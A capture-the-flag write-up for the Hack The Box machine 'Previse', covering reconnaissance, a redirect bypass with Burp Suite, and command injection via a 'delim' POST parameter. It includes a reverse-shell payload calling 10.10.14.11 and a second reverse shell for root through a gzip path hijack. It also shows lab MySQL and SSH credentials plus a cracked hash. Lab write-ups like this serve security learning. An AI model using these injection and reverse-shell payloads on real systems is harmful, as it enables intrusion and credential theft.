![](previse%20logo.png)


## nmap all ports
![](Previse/screenshots/nmap%20all%20ports.png)

## nmap services + versions
![](Previse/screenshots/nmap%20services%20and%20versions.png)

![](apache%20release%20date.png)

## gobuster
![](gobuster%20main%20redirects.png)
normally redirects have a size of 0 
but here redirects hava a size > 0
intercept redirects with burpsuite

## domain
![](main%20domain%20redirect%20to%20login.php.png)

## burpsuite
### request
![](burpsuite%20request%20redirect.png)

### response
![](burpsuite%20intercept%20response%20redirect.png)

### response change status code to 200 OK and forward
![](burpsuite%20change%20status%20code.png)

### new domain with login bypassed but immediately redirect to login.php
![](Previse/screenshots/login%20dashboard.png)

### lets make an account --> turn intercept of
![](create%20account.png)

### login
![](login%20to%20new%20account.png)

### login dashboard
![](login%20dashboard%201.png)

### login files
![](login%20files.png)

### dowload SITEBACKUP.ZIP and inspect user input

````
grep '$_' * | grep -v "SESSION\|SERVER"

`````

![](server%20backup%20user%20input%20exec.png)

### python scripts executes post command with parameter delim
````
logs.php:$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");

`````

### also parameter delim
![](burpsuite%20command%20execution.png)

### add sleep command --> response is waiting for 5 seconds
![](burpsuite%20command%20execution%20sleep.png)

### create reverse shell
post data
```
delim=comma;bash -c 'bash -i >& /dev/tcp/10.10.14.11/1111 0>&1'

//url encoded

delim=comma;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.11/1111+0>%261'

```

### get shell as www-data
![](burpsuite%20get%20reverse%20shell.png)

### always look first in config files on servers
![](config%20file%20reveals%20password%20mysql.png)

````mysql

root:mySQL_P@ssw0rd!:)


`````

### connect to mysql
````
mysql -u root -p


`````

### mysql
````
show databases;

use previse;

show tables;

select * from accounts;

select * from accounts where id = 1;

select TO_BASE64(password) from accounts where id = 1;



`````

![](mysql%20extract%20info.png)

![](mysql%20get%20password.png)

### password hash to base64 because of special charaters in password
![](mysql%20convert%20to%20base64.png)
````
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.

JDEk8J+ngmxsb2wkRFFwbWR2bmI3RWV1TzZVYXFSSXRmLg==

`````

### hashcat
![](hashcat.png)
````
m4lwhere:ilovecody112235!

`````

### ssh with new creds
![](ssh%20m4lwhere.png)

### user.txt
![](Previse/screenshots/user.txt.png)

### root.txt error stdout not printing
![](root.txt.png)

### gzip reverse shell
````bash

bash -i >& /dev/tcp/10.10.14.1111/1111 0>&1

`````

![](root%20reverse%20shell%20gzip.png)

### root shell working
![](root%20shell%20working.png)
XXXXXXXXXXXX